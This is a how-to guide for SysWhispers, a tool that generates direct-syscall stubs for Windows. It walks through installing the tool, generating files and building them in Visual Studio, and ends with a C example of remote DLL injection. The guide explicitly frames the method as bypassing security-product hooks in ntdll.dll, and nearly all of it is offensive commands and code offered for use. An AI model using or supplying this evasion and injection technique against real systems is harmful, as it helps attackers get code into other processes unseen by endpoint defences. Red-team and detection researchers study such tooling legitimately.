## Direct Syscalls via SysWhispers

Generates header and ASM file pairs that implement direct syscalls, bypassing user-mode API hooks placed by security solutions in `ntdll.dll`. At runtime the generated assembly reads `OSMajorVersion`, `OSMinorVersion`, and `OSBuildNumber` directly from the PEB to determine the correct Syscall Service Number (SSN) for the target Windows version, then executes the syscall stub inline. Supports Windows XP through Windows 10 20H2 (19042). x64 only.

**Usage**

Run the commands in order. Supply your own output file name and target functions or preset where angle brackets appear.

**Step 1 — Install**

```
git clone https://github.com/jthuraisamy/SysWhispers.git
cd SysWhispers
pip3 install -r requirements.txt
```

**Step 2 — Generate files**

```
# Export all supported syscalls for all Windows versions.
py syswhispers.py --preset all -o syscalls_all

# Export common syscalls for Windows 7, 8, and 10 only.
py syswhispers.py --preset common -o syscalls_common

# Export specific functions for all Windows versions.
py syswhispers.py --functions <Func1,Func2,...> -o <output_name>

# Export specific functions for specific Windows versions only.
py syswhispers.py --functions <Func1,Func2,...> --versions 7,8,10 -o <output_name>
```

- `--preset`  Use `all` or `common` to export a predefined set of syscalls.
- `--functions`  Comma-separated list of NT functions to export (e.g. `NtAllocateVirtualMemory,NtWriteVirtualMemory`).
- `--versions`  Comma-separated Windows versions to target (e.g. `7,8,10`). Omit for all versions.
- `-o`  Base name for the output `.h` and `.asm` files.

**Step 3 — Import into Visual Studio**

```
1. Copy the generated .h and .asm files into the project folder.
2. Project → Build Customizations → enable MASM.
3. Add the .h as a header file and the .asm as a source file in Solution Explorer.
4. Set the .asm file's Item Type to "Microsoft Macro Assembler".
5. Ensure the project platform is set to x64.
```

**Step 4 — Use in code**

```c
#include "syscalls.h"   // Include the generated header.

// Replace WinAPI calls with the generated NT equivalents.
// Example — remote DLL injection:

HANDLE hThread          = NULL;
LPVOID lpAllocationStart = NULL;
SIZE_T szAllocationSize  = strlen(dllPath);
LPVOID lpStartAddress    = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryA");

// NtAllocateVirtualMemory replaces VirtualAllocEx.
NtAllocateVirtualMemory(hProcess, &lpAllocationStart, 0, &szAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

// NtWriteVirtualMemory replaces WriteProcessMemory.
NtWriteVirtualMemory(hProcess, lpAllocationStart, (PVOID)dllPath, strlen(dllPath), NULL);

// NtCreateThreadEx replaces CreateRemoteThread.
NtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, hProcess, lpStartAddress, lpAllocationStart, FALSE, 0, 0, 0, NULL);
```

**Output**

Two files — `<output_name>.h` and `<output_name>.asm` — are written to the current directory. The `.h` file contains the NT function prototypes and required type definitions. The `.asm` file contains the version-aware syscall stubs.

**Requirements**

- Python 3 with `pip3`
- Visual Studio 2019+ with MASM build customization enabled
- x64 project target — 32-bit is not supported
